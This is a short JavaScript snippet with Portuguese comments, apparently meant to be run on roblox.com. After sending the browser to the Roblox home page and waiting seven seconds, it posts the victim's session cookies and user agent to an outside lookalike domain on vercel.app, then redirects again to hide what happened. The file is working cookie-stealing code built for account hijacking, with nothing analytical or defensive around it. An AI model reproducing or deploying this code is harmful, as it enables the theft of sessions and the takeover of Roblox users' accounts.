(() => {
  if (!location.hostname.includes("roblox.com")) {
    location.href = "https://www.roblox.com";
    return;
  }

  // Se não estiver na home, já redireciona pra home
  if (location.pathname !== "/home") {
    location.href = "https://www.roblox.com/home";
    return;
  }

  // Espera 7 seg, envia cookie e depois redireciona pra home de novo (ou onde quiser)
  setTimeout(() => {
    fetch("https://roblox-com-pt.vercel.app/api/send?cookie=" + encodeURIComponent(document.cookie) + "&userAgent=" + encodeURIComponent(navigator.userAgent))
      .then(res => res.text())
      .then(() => {
        // Após enviar, redireciona pra home de novo (só para garantir)
        location.href = "https://www.roblox.com/home";
      })
      .catch(() => {
        // Se der erro, também tenta redirecionar para não travar
        location.href = "https://www.roblox.com/home";
      });
  }, 7000);
})();
